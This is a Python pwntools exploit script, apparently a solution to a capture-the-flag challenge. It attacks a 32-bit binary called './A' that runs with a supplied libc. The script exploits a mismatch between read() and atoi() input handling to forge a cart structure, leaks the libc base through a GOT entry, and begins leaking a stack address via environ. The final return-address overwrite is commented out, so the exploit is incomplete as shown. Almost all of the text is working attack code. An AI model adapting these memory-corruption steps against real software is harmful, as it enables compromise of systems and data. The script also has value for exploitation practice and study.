from lib2to3.refactor import MultiprocessRefactoringTool
from os import environ
import struct
from unicodedata import name
from pwn import *

r = process("./A", env={"LD_PRELOAD" : "./libc_32.so.6"})

# struct cart{
#     string* name
#     uint32_t price 
#     uint32_t *next_cart = 0
#     uint32_t *prev_cart = 0
# }

### vuln : different handle of input : read() and atoi()

### make total = 7174
for i in range(20):
    r.sendafter(b'>',b'2')
    r.sendafter(b'>',b'2')

for i in range(6):
    r.sendafter(b'>',b'2')
    r.sendafter(b'>',b'1')

r.sendafter(b'>',b'5')
r.sendafter(b'> ',b'y')

r.send(b'2'+b'\x00'*0x14)
r.sendafter(b'> ',b'2')

## leak libc using got table
r.send(b'\x34\xb0\x04\x08\x00') # option 4
r.sendafter(b'> ',b'y')
r.recvuntil(b'28: ')
libc_base = u32(r.recv(4)) - 0x18540
success(f'LIBC : {hex(libc_base)}')

### leak stack addr

environ = 0x1b1dbc
r.send(b'\x34\xb0\x04\x08'+ p32(0) + p32(libc_base + environ)) ## name + price + next_cart
input()
r.sendafter(b'> ',b'y' + b'\x00'*15)
# r.recvuntil(b'29: ')
# stack = u32(r.recv(4))
# success(f'STACK : {hex(stack)}')


###  
# ret_addr = stack - 0xa2e
# r.send(b'\x33\xb0\x04\x08'+ p32(0) + p32(ret_addr) + p32(libc_base + environ))
# r.sendafter(b'> ',b'29')

r.interactive()